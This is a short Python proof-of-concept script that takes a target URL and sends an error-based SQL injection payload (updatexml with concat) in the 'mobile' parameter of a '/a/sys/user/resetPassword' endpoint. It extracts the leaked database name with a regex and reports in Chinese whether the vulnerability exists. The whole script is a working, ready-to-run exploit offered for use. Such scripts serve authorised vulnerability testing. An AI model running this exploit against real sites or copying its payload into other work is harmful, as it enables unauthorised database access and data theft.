#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

patt = "XPATH syntax error: '~([^']+)'"

def verify(site):
    burp0_url = site + "/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20database()),0x7e),1))%23"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"}
    req = requests.get(burp0_url, headers=burp0_headers)
    data = re.findall(patt, req.text)
    if len(data) != 0:
        return data[0]
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询当前数据库的名称，结果为：", info)
    else:
        print("[-]漏洞不存在")
